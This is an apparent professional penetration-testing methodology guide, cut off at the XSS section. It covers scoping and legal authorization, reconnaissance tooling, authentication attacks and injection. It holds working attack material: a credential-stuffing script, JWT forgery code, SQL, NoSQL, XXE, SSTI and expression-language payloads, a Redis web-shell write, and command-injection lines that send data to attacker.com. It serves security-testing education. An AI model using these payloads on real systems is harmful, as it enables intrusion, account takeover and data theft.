# Web Application Penetration Testing — Complete Methodology

## Table of Contents

1. [Penetration Testing Methodology](#1-penetration-testing-methodology)
2. [Reconnaissance and Information Gathering](#2-reconnaissance-and-information-gathering)
3. [Authentication Testing](#3-authentication-testing)
4. [Injection Attacks](#4-injection-attacks)
5. [Cross-Site Scripting (XSS)](#5-cross-site-scripting-xss)
6. [Server-Side Request Forgery (SSRF)](#6-server-side-request-forgery-ssrf)
7. [Business Logic and Access Control](#7-business-logic-and-access-control)
8. [Advanced Exploitation](#8-advanced-exploitation)
9. [Reporting and Remediation](#9-reporting-and-remediation)
10. [Tool Arsenal and Automation](#10-tool-arsenal-and-automation)

---

## 1. Penetration Testing Methodology

### 1.1 OWASP Testing Guide v4.2 Framework

The OWASP Testing Guide v4.2 defines a structured approach to web application security assessment, organized into eleven categories:

| Category | ID Range | Focus |
|----------|----------|-------|
| Information Gathering | OTG-INFO | Fingerprinting, application mapping |
| Configuration Management | OTG-CONFIG | Platform/server misconfiguration |
| Identity Management | OTG-IDENT | User registration, account provisioning |
| Authentication | OTG-AUTHN | Login mechanisms, password policies |
| Authorization | OTG-AUTHZ | Access control, privilege escalation |
| Session Management | OTG-SESS | Cookies, tokens, session fixation |
| Input Validation | OTG-INPVAL | Injection, XSS, format string |
| Error Handling | OTG-ERR | Stack traces, error codes |
| Cryptography | OTG-CRYPST | Weak ciphers, key management |
| Business Logic | OTG-BUSLOGIC | Workflow bypass, race conditions |
| Client-Side | OTG-CLIENT | DOM XSS, clickjacking, WebSocket |

Each test has a unique identifier (e.g., `OTG-AUTHN-001` for credential transport over encrypted channel) enabling traceable coverage mapping against your assessment scope.

### 1.2 PTES — Penetration Testing Execution Standard

PTES defines seven phases that apply to any engagement, providing a universal language between assessor and client:

```
┌─────────────────┐     ┌────────────────┐     ┌──────────────────┐
│ Pre-Engagement  │────▶│ Intelligence   │────▶│ Threat Modeling   │
│ Interactions    │     │ Gathering      │     │                  │
└─────────────────┘     └────────────────┘     └──────────────────┘
         │                                              │
         ▼                                              ▼
┌─────────────────┐     ┌────────────────┐     ┌──────────────────┐
│ Reporting       │◀────│ Post-          │◀────│ Exploitation      │
│                 │     │ Exploitation   │     │                  │
└─────────────────┘     └────────────────┘     └──────────────────┘
                                                        ▲
                        ┌────────────────┐              │
                        │ Vulnerability  │──────────────┘
                        │ Analysis       │
                        └────────────────┘
```

### 1.3 Pre-Engagement — Scope, Rules of Engagement, Legal Considerations

A penetration test without a properly scoped engagement is unauthorized access. The pre-engagement phase is non-negotiable.

**Scope Definition Document Must Include:**

- Target IP ranges, FQDNs, and URLs (explicit include/exclude lists)
- Testing window (dates, hours, timezone)
- Acceptable testing techniques (social engineering allowed? DoS simulation?)
- Out-of-scope systems, third-party integrations, shared infrastructure
- Production vs. staging environment designation
- Data handling restrictions (PII encountered during test)
- Communication channels and escalation contacts
- Emergency stop procedures

**Rules of Engagement (RoE):**

```
RULES OF ENGAGEMENT — Template Structure
─────────────────────────────────────────
1. Authorization:       Written permission from asset owner (not just IT manager)
2. Testing Type:        Black-box / Gray-box / White-box
3. Boundaries:          No DoS, no social engineering of C-suite, no physical
4. Notification:        SOC will/will not be informed (purple team vs. red team)
5. Credential Scope:    Testing accounts provided? Credential reset allowed?
6. Data Sensitivity:    Stop/report if PII/PHI/PCI data exfiltrated
7. Retesting:           Remediation verification included in scope?
8. Evidence Handling:   AES-256 encrypted storage, destroyed 90 days post-report
```

**Legal Considerations:**

- Obtain signed authorization from an individual with legal authority over the assets
- Verify jurisdiction — cross-border testing may invoke multiple legal frameworks (CFAA in the US, Computer Misuse Act in the UK, EU Directive 2013/40/EU)
- Carry indemnification/liability insurance (E&O, cyber liability)
- Document chain of custody for all artifacts
- Understand that authorization from a cloud tenant does not authorize testing the underlying cloud infrastructure — cloud providers have separate pentest notification requirements (AWS requires notification for certain tests, Azure requires none for their tenant, GCP has a policy page)
- Third-party hosted components (CDN, WAF, SaaS integrations) require separate written authorization from those providers

### 1.4 Information Gathering

This phase maps the attack surface. Detailed tooling and techniques are covered in Section 2. The methodology here dictates:

1. **Passive first** — never alert the target before active scanning begins
2. **Document everything** — IP addresses, subdomains, technologies, personnel, third-party relationships
3. **Validate findings** — cross-reference multiple sources to reduce false positives
4. **Iterative** — new findings in later phases feed back into this phase

### 1.5 Threat Modeling

After information gathering, model threats against the specific application:

- **STRIDE** against each component: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege
- **Attack Trees** for complex chains (SSRF → metadata → credential → lateral movement)
- **Data Flow Diagrams (DFD)** to identify trust boundaries — every trust boundary crossing is a test target
- **Crown Jewels Analysis** — what does the attacker ultimately want? Shape your exploitation priorities accordingly

### 1.6 Vulnerability Analysis

Systematically identify weaknesses without yet proving exploitation:

- Automated scanning (Nuclei, Burp Scanner, OWASP ZAP active scan)
- Manual parameter fuzzing
- Source code review if white-box (Semgrep, CodeQL)
- Configuration review (TLS, headers, CORS, cookie flags)
- Correlate scanner output with manual verification — scanners produce false positives at rates exceeding 30%

### 1.7 Exploitation

Prove impact. A vulnerability without demonstrated exploitation is a theoretical finding and carries less weight with stakeholders.

Principles:
- Exploit the minimum necessary to demonstrate impact
- Never exfiltrate real user data — use synthetic proof (e.g., read `/etc/hostname`, create a canary file)
- Screenshot every step
- Document exact reproduction steps
- Time-stamp all actions (UTC ISO 8601)

### 1.8 Post-Exploitation

Determine the real-world impact of a successful compromise:

- Credential harvesting from configuration files, environment variables, databases
- Lateral movement potential (can you reach internal services from this foothold?)
- Data access scope (what databases, object stores, secrets are reachable?)
- Persistence mechanisms (can an attacker maintain access undetected?)
- Clean up: remove all test artifacts, shells, accounts created during testing

### 1.9 Reporting

The report is the deliverable. Detailed reporting guidance is in Section 9.

---

## 2. Reconnaissance and Information Gathering

### 2.1 Passive Reconnaissance — OSINT

Passive recon generates zero traffic to the target. All data comes from public sources.

**Shodan Queries:**

```bash
# Find target's web servers
shodan search "hostname:target.com" --fields ip_str,port,org,http.title

# Find specific technology
shodan search "http.component:nginx hostname:target.com"

# SSL certificate search
shodan search "ssl.cert.subject.cn:target.com"
```

**Censys:**

```bash
# Certificate transparency search
censys search "parsed.subject.common_name: target.com" --index certificates

# Host search
censys search "services.http.response.headers.server: Apache AND autonomous_system.name: TargetOrg"
```

**Certificate Transparency Logs:**

```bash
# Using crt.sh
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Using certspotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true" | jq -r '.[].dns_names[]' | sort -u
```

**Google Dorking:**

```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:env OR ext:yml OR ext:config
site:target.com inurl:api
"target.com" site:github.com
"target.com" site:pastebin.com
```

### 2.2 DNS Enumeration

```bash
# Zone transfer attempt (rarely succeeds but always try)
dig axfr target.com @ns1.target.com

# DNS record enumeration
dig target.com ANY
dig target.com MX
dig target.com TXT
dig target.com NS
dig _dmarc.target.com TXT

# Reverse DNS
dig -x 203.0.113.50

# DNSRecon comprehensive scan
dnsrecon -d target.com -t std,brt,axfr -D /usr/share/wordlists/subdomains-top1million-5000.txt
```

### 2.3 Subdomain Discovery

```bash
# Subfinder — passive subdomain enumeration
subfinder -d target.com -all -recursive -o subdomains.txt

# Amass — comprehensive enumeration (passive + active)
amass enum -d target.com -passive -o amass_passive.txt
amass enum -d target.com -active -brute -w /usr/share/wordlists/all.txt -o amass_active.txt

# Combine and deduplicate
cat subdomains.txt amass_passive.txt amass_active.txt | sort -u > all_subdomains.txt

# Resolve live subdomains
cat all_subdomains.txt | httpx -status-code -title -tech-detect -o live_subdomains.txt

# Check for subdomain takeover potential
subjack -w all_subdomains.txt -t 50 -timeout 30 -ssl -o takeover_candidates.txt
```

### 2.4 Technology Fingerprinting

```bash
# WhatWeb — aggressive fingerprinting
whatweb -a 3 https://target.com --log-json=whatweb.json

# Wappalyzer CLI (via webanalyze)
webanalyze -host https://target.com -crawl 2

# HTTP header analysis
curl -sI https://target.com | grep -iE "^(server|x-powered-by|x-aspnet|x-generator|via):"

# Nmap service/version detection
nmap -sV -sC -p 80,443,8080,8443 target.com -oN nmap_web.txt
```

### 2.5 Directory and File Bruteforcing

```bash
# Gobuster — directory mode
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,js,json,txt,bak,old,zip \
  -t 50 -o gobuster_results.txt --no-error

# Feroxbuster — recursive with auto-calibration
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  --smart --auto-tune --depth 3 --threads 50 \
  -x php,asp,aspx,jsp,bak,old,conf,sql,zip \
  -o ferox_results.txt

# ffuf — fast fuzzing with filtering
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -fc 404 -ac -t 100 -o ffuf_results.json -of json

# ffuf — virtual host discovery
ffuf -u https://target.com -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 4242  # filter by response size of default page
```

### 2.6 Parameter Discovery

```bash
# Arjun — HTTP parameter discovery
arjun -u https://target.com/api/endpoint -m GET,POST -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# ParamSpider — mining parameters from web archives
paramspider -d target.com --output params.txt

# x8 — hidden parameter discovery
x8 -u "https://target.com/page" -w params.txt --method GET POST

# Wayback Machine parameter extraction
waybackurls target.com | grep "?" | uro | sort -u > wayback_params.txt
```

### 2.7 API Endpoint Enumeration

```bash
# Extract endpoints from JavaScript files
# Step 1: Gather JS files
gau target.com | grep -iE "\.js$" | sort -u > js_files.txt
cat js_files.txt | httpx -mc 200 -o live_js.txt

# Step 2: Extract endpoints from JS
cat live_js.txt | while read url; do
  curl -s "$url" | grep -oP '["'"'"'](\/[a-zA-Z0-9_\-\/\.]+)["'"'"']' | sort -u
done > js_endpoints.txt

# LinkFinder — more sophisticated JS analysis
python3 linkfinder.py -i https://target.com -d -o cli

# Kiterunner — API endpoint bruteforce with method detection
kr scan https://target.com -w /path/to/routes-large.kite -x 5 --fail-status-codes 404,403
```

### 2.8 JavaScript File Analysis for Endpoints and Secrets

```python
#!/usr/bin/env python3
"""js_secret_scanner.py — Extract secrets and endpoints from JavaScript files."""

import re
import sys
import requests
from urllib.parse import urljoin

SECRET_PATTERNS = {
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key": r"(?i)aws(.{0,20})?(?-i)['\"][0-9a-zA-Z/+]{40}['\"]",
    "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
    "Slack Token": r"xox[baprs]-[0-9a-zA-Z]{10,48}",
    "Private Key": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
    "Generic Secret": r"(?i)(secret|password|passwd|token|api_key|apikey)[\s]*[=:][\s]*['\"][^\s'\"]{8,}['\"]",
    "JWT": r"eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+",
    "Internal URL": r"https?://[a-zA-Z0-9\-\.]*internal[a-zA-Z0-9\-\.]*\.[a-z]{2,}",
    "S3 Bucket": r"[a-zA-Z0-9\-\.]+\.s3\.amazonaws\.com",
    "Firebase": r"https://[a-zA-Z0-9\-]+\.firebaseio\.com",
}

API_ENDPOINT_PATTERN = re.compile(
    r"""(?:['"`])(/(?:api|v[0-9]|graphql|rest|auth|user|admin|internal)[^\s'"`{}<>]{2,})(?:['"`])"""
)


def scan_js(url: str) -> dict:
    """Scan a single JS file for secrets and endpoints."""
    resp = requests.get(url, timeout=15)
    content = resp.text
    findings = {"secrets": [], "endpoints": []}

    for name, pattern in SECRET_PATTERNS.items():
        matches = re.findall(pattern, content)
        for match in matches:
            findings["secrets"].append({"type": name, "value": match[:80], "url": url})

    endpoints = API_ENDPOINT_PATTERN.findall(content)
    findings["endpoints"] = list(set(endpoints))

    return findings


if __name__ == "__main__":
    target_js_urls = sys.argv[1:]
    for js_url in target_js_urls:
        results = scan_js(js_url)
        if results["secrets"]:
            print(f"\n[!] Secrets in {js_url}:")
            for s in results["secrets"]:
                print(f"    [{s['type']}] {s['value']}")
        if results["endpoints"]:
            print(f"\n[+] Endpoints in {js_url}:")
            for ep in results["endpoints"]:
                print(f"    {ep}")
```

---

## 3. Authentication Testing

### 3.1 Brute Force Attacks and Protections

```bash
# Hydra — HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 16 -f

# ffuf — brute force with rate limiting awareness
ffuf -u https://target.com/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -fc 401 -rate 10
```

**Detection of protections:**
- Account lockout after N attempts (test with known-good account)
- CAPTCHA triggering thresholds
- IP-based rate limiting (test with rotating IPs)
- Progressive delays (exponential backoff detection)
- Response timing differences (indicates user enumeration)

### 3.2 Credential Stuffing

Credential stuffing uses breached credentials from other services. Distinct from brute force — it uses known-valid credential pairs.

```python
#!/usr/bin/env python3
"""credential_stuffer.py — Demonstrate credential stuffing detection testing."""

import httpx
import asyncio
from pathlib import Path

TARGET = "https://target.com/api/auth/login"
CRED_FILE = "breach_creds.txt"  # format: email:password


async def attempt_login(client: httpx.AsyncClient, email: str, password: str) -> dict:
    """Single login attempt."""
    resp = await client.post(
        TARGET,
        json={"email": email, "password": password},
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    )
    return {
        "email": email,
        "status": resp.status_code,
        "success": resp.status_code == 200,
        "headers": dict(resp.headers),
    }


async def run_stuffing_test(max_concurrent: int = 5):
    """Run credential stuffing with concurrency control."""
    creds = Path(CRED_FILE).read_text().strip().splitlines()
    semaphore = asyncio.Semaphore(max_concurrent)

    async with httpx.AsyncClient(timeout=10.0) as client:
        async def bounded_attempt(line: str):
            async with semaphore:
                email, password = line.split(":", 1)
                return await attempt_login(client, email, password)

        results = await asyncio.gather(*[bounded_attempt(line) for line in creds[:100]])

    successful = [r for r in results if r["success"]]
    print(f"[*] Tested {len(results)} credentials, {len(successful)} valid")
    for hit in successful:
        print(f"    [+] {hit['email']}")


if __name__ == "__main__":
    asyncio.run(run_stuffing_test())
```

### 3.3 Password Spraying

Spray one or two passwords across many accounts to stay below lockout thresholds:

```bash
# Using sprayhound or custom logic
# Pattern: try "Summer2024!" against all known usernames, then wait lockout window

# Enumerate valid usernames first via timing/response differences
ffuf -u https://target.com/api/auth/check -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"FUZZ@target.com"}' \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -fr "User not found" -o valid_users.txt
```

### 3.4 Default Credentials

Always test default credentials for identified technologies:

| Technology | Default Credentials |
|-----------|-------------------|
| Tomcat Manager | tomcat:tomcat, admin:admin, admin:s3cret |
| Jenkins | admin:admin (or no auth) |
| JBoss | admin:admin |
| WordPress | admin:admin, admin:password |
| phpMyAdmin | root:(empty), root:root |
| Grafana | admin:admin |
| Elasticsearch | elastic:changeme |
| MongoDB | (no auth by default) |
| Redis | (no auth by default) |
| Spring Boot Actuator | (no auth by default) |

### 3.5 Multi-Factor Authentication Bypass Techniques

1. **Response manipulation** — intercept and modify the MFA validation response (change `"success": false` to `"success": true`)
2. **Brute force OTP** — 4-digit codes have only 10,000 possibilities; test rate limiting
3. **OTP reuse** — test whether a valid OTP can be replayed
4. **Backup code brute force** — often 8 alphanumeric characters
5. **SIM swap** — out of scope for most engagements but document the vector
6. **OAuth flow bypass** — skip MFA by authenticating through SSO that trusts the session
7. **Direct endpoint access** — access post-auth pages directly if MFA is only client-side enforced
8. **Session token leakage** — pre-MFA session token might grant partial access

### 3.6 OAuth/OIDC Vulnerabilities

**Authorization Code Interception:**

```
# Test: Missing or weak redirect_uri validation
# Attempt 1: Exact match bypass
https://auth.target.com/authorize?client_id=app&redirect_uri=https://evil.com&response_type=code

# Attempt 2: Path traversal
https://auth.target.com/authorize?client_id=app&redirect_uri=https://target.com/callback/../../../evil.com&response_type=code

# Attempt 3: Subdomain matching exploitation
https://auth.target.com/authorize?client_id=app&redirect_uri=https://attacker.target.com/steal&response_type=code

# Attempt 4: Open redirect chaining
https://auth.target.com/authorize?client_id=app&redirect_uri=https://target.com/redirect?url=https://evil.com&response_type=code
```

**Token Leakage via Referrer:**

```
# If tokens are passed as URL fragments or query parameters:
# 1. Find any page with external links/images after auth
# 2. Token leaks via Referer header to external resources
# Test: Check if token endpoint uses fragment vs query for token delivery
```

**PKCE Bypass:**

```
# Test 1: Omit code_verifier from token request
# If server accepts token exchange without code_verifier, PKCE is not enforced

# Test 2: Use plain challenge method when S256 should be required
POST /token
grant_type=authorization_code&code=AUTH_CODE&code_verifier=anything&code_challenge_method=plain
```

### 3.7 JWT Attacks

```python
#!/usr/bin/env python3
"""jwt_attacks.py — Common JWT attack vectors for testing."""

import base64
import json
import hmac
import hashlib


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    data += "=" * padding
    return base64.urlsafe_b64decode(data)


def none_algorithm_attack(token: str) -> str:
    """CVE-2015-9235 — alg:none bypass."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    # Modify claims
    payload["role"] = "admin"
    payload["sub"] = "admin"

    # Set algorithm to none
    header["alg"] = "none"

    new_header = b64url_encode(json.dumps(header).encode())
    new_payload = b64url_encode(json.dumps(payload).encode())

    # Empty signature
    return f"{new_header}.{new_payload}."


def algorithm_confusion_attack(token: str, public_key: str) -> str:
    """RS256 → HS256 confusion — sign with the public key as HMAC secret."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    payload["role"] = "admin"
    header["alg"] = "HS256"

    new_header = b64url_encode(json.dumps(header).encode())
    new_payload = b64url_encode(json.dumps(payload).encode())

    # Sign with public key as HMAC secret
    signing_input = f"{new_header}.{new_payload}".encode()
    signature = hmac.new(public_key.encode(), signing_input, hashlib.sha256).digest()

    return f"{new_header}.{new_payload}.{b64url_encode(signature)}"


def kid_injection(token: str) -> str:
    """Key ID (kid) injection for path traversal or SQL injection."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    # Path traversal — point to known file content
    header["kid"] = "../../../../../../dev/null"
    header["alg"] = "HS256"

    payload["role"] = "admin"

    new_header = b64url_encode(json.dumps(header).encode())
    new_payload = b64url_encode(json.dumps(payload).encode())

    # Sign with empty string (content of /dev/null)
    signing_input = f"{new_header}.{new_payload}".encode()
    signature = hmac.new(b"", signing_input, hashlib.sha256).digest()

    return f"{new_header}.{new_payload}.{b64url_encode(signature)}"


def claim_manipulation(token: str, claims: dict) -> str:
    """Modify JWT claims without re-signing (test if signature is verified)."""
    parts = token.split(".")
    payload = json.loads(b64url_decode(parts[1]))
    payload.update(claims)
    new_payload = b64url_encode(json.dumps(payload).encode())
    return f"{parts[0]}.{new_payload}.{parts[2]}"
```

### 3.8 Session Management Testing

Test vectors:

- **Session fixation** — can an attacker set the session ID before authentication?
- **Session ID entropy** — collect 1000+ session IDs and analyze randomness (Burp Sequencer)
- **Session invalidation** — does logout actually destroy the server-side session?
- **Concurrent sessions** — can two simultaneous sessions exist? Is there a limit?
- **Session timeout** — does idle timeout actually enforce server-side expiry?
- **Cross-site session leakage** — is the session ID exposed in URLs, logs, or Referer headers?

### 3.9 Cookie Security Assessment

```bash
# Check cookie attributes
curl -sI https://target.com/login -X POST -d "user=admin&pass=admin" | grep -i "set-cookie"

# Expected secure cookie:
# Set-Cookie: session=abc123; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
```

| Attribute | Missing = Vulnerability |
|-----------|------------------------|
| `Secure` | Cookie sent over HTTP — session hijack via MITM |
| `HttpOnly` | Cookie readable by JavaScript — XSS escalation |
| `SameSite=Strict/Lax` | CSRF possible via cross-origin requests |
| `Path=/` | Overly broad scope — cookie leaks to unrelated paths |
| `Domain` | Overly broad domain — cookie shared with subdomains |
| `Max-Age` / `Expires` | Persistent session — survives browser close |

---

## 4. Injection Attacks

### 4.1 SQL Injection — Complete Taxonomy

#### UNION-Based SQLi

```sql
-- Step 1: Determine column count
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 5-- -  (increment until error)

-- Step 2: Find displayable columns
' UNION SELECT NULL,NULL,NULL,NULL-- -
' UNION SELECT 'a',NULL,NULL,NULL-- -
' UNION SELECT NULL,'a',NULL,NULL-- -

-- Step 3: Extract data
' UNION SELECT username,password,NULL,NULL FROM users-- -
' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

#### Blind Boolean-Based SQLi

```sql
-- Binary search for data extraction
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 77-- -
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 100-- -
-- Narrow range until exact character found
```

#### Blind Time-Based SQLi

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)-- -

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -

-- Oracle
' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END-- -
```

#### Error-Based SQLi

```sql
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- -

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INTEGER)-- -

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))-- -
```

#### Stacked Queries

```sql
-- MSSQL (commonly supports stacked)
'; EXEC xp_cmdshell('whoami')-- -

-- PostgreSQL
'; CREATE TABLE exfil(data TEXT); COPY exfil FROM '/etc/passwd'; SELECT * FROM exfil-- -

-- MySQL (less common in web context, depends on connector)
'; INSERT INTO admin_users(username,password) VALUES('attacker','hash')-- -
```

#### Second-Order SQLi

```
1. Register with username: admin'-- -
2. Application stores this verbatim in the database
3. Later, another query uses this stored value unsafely:
   SELECT * FROM user_profiles WHERE username = '{stored_username}'
4. The injected SQL triggers during the second operation
```

### 4.2 sqlmap Complete Usage

```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1" --batch --random-agent

# POST parameter injection
sqlmap -u "https://target.com/search" --data="query=test&page=1" -p query --batch

# Cookie-based injection
sqlmap -u "https://target.com/dashboard" --cookie="session=abc123; user_id=1" -p user_id --batch

# With authentication
sqlmap -u "https://target.com/api/user?id=1" --headers="Authorization: Bearer <token>" --batch

# Enumeration
sqlmap -u "https://target.com/page?id=1" --dbs                          # List databases
sqlmap -u "https://target.com/page?id=1" -D mydb --tables               # List tables
sqlmap -u "https://target.com/page?id=1" -D mydb -T users --columns     # List columns
sqlmap -u "https://target.com/page?id=1" -D mydb -T users --dump        # Dump data

# Advanced techniques
sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3             # Maximum detection
sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10    # Time-based only
sqlmap -u "https://target.com/page?id=1" --os-shell                     # OS shell attempt
sqlmap -u "https://target.com/page?id=1" --file-read="/etc/passwd"      # File read

# Tamper scripts for WAF bypass
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Using saved request from Burp
sqlmap -r request.txt --batch --threads=10
```

### 4.3 NoSQL Injection

**MongoDB:**

```json
// Authentication bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// Data extraction via $regex
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
// ... character by character

// $where injection
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
{"$where": "sleep(5000)"}  // time-based blind
```

**Redis (via SSRF or direct access):**

```
# Command injection in Redis
SET exploit "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE
```

### 4.4 OS Command Injection

```bash
# Basic concatenation
; whoami
| whoami
|| whoami
& whoami
&& whoami
$(whoami)
`whoami`

# Newline injection
%0a whoami
%0d%0a whoami

# Blind detection — DNS/HTTP callback
; nslookup attacker.com
; curl http://attacker.com/$(whoami)
| ping -c 3 attacker.com

# Blind detection — time-based
; sleep 10
| sleep 10

# Filter bypass
;w'h'oami
;w"h"oami
;/???/??t /???/p??s??  # /bin/cat /etc/passwd via wildcards
;$(printf '\x77\x68\x6f\x61\x6d\x69')  # whoami via hex
```

### 4.5 LDAP Injection

```
# Authentication bypass
username: *
password: *

# Blind extraction
username: admin)(|(password=a*))
username: admin)(|(password=ab*))

# OR injection for user enumeration
*)(&
*)(uid=*))(|(uid=*
```

### 4.6 XML Injection / XXE

**In-Band XXE:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Blind XXE with External DTD:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>
```

```
<!-- evil.dtd hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

**OOB DNS Exfiltration:**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/oob.dtd">
  %dtd;
]>
```

**SSRF via XXE:**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

**XXE in file uploads (XLSX, DOCX, SVG):**

```xml
<!-- SVG with XXE -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### 4.7 Server-Side Template Injection (SSTI)

**Detection polyglot:**

```
${{<%[%'"}}%\
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
```

**Jinja2 (Python):**

```python
# Detection
{{7*7}}  # Returns 49
{{config}}  # Dumps Flask config

# RCE
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]('whoami',shell=True,stdout=-1).communicate()}}
# Where XXX is the index of subprocess.Popen

# Shorter RCE payload
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Twig (PHP):**

```
# Detection
{{7*7}}  # Returns 49

# RCE (Twig 1.x)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

# Twig 3.x
{{['whoami']|filter('system')}}
{{app.request.server.all|join(',')}}
```

**Freemarker (Java):**

```
# Detection
${7*7}  # Returns 49

# RCE
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("whoami")}

# Alternative
${"freemarker.template.utility.Execute"?new()("id")}
```

**Velocity (Java):**

```
# Detection
#set($x = 7 * 7)$x  # Returns 49

# RCE
#set($rt = $class.forName("java.lang.Runtime"))
#set($getRuntime = $rt.getMethod("getRuntime"))
#set($runtime = $getRuntime.invoke($rt))
#set($exec = $runtime.exec("whoami"))
#set($is = $exec.getInputStream())
#set($isr = $class.forName("java.io.InputStreamReader").getConstructor($is.getClass()).newInstance($is))
#set($br = $class.forName("java.io.BufferedReader").getConstructor($isr.getClass()).newInstance($isr))
$br.readLine()
```

### 4.8 Expression Language Injection

```java
// Java EL Injection
${7*7}
${applicationScope}
${Runtime.getRuntime().exec("whoami")}

// Spring EL
${T(java.lang.Runtime).getRuntime().exec('whoami')}

// OGNL (Struts2)
%{#cmd='whoami',#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')),#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}),#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start()}
```

### 4.9 Header Injection

**Host Header Injection:**

```http
GET /password-reset HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

# Password reset link now points to evil.com
# Test: intercept password reset email — is the link using attacker-controlled host?
```

**CRLF Injection:**

```
# Inject headers
https://target.com/redirect?url=http://target.com%0d%0aSet-Cookie:%20admin=true
https://target.com/page?param=value%0d%0a%0d%0a<script>alert(1)</script>

# Response splitting
/page?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>injected</html>
```

---

## 5. Cross-Site Scripting (XSS)

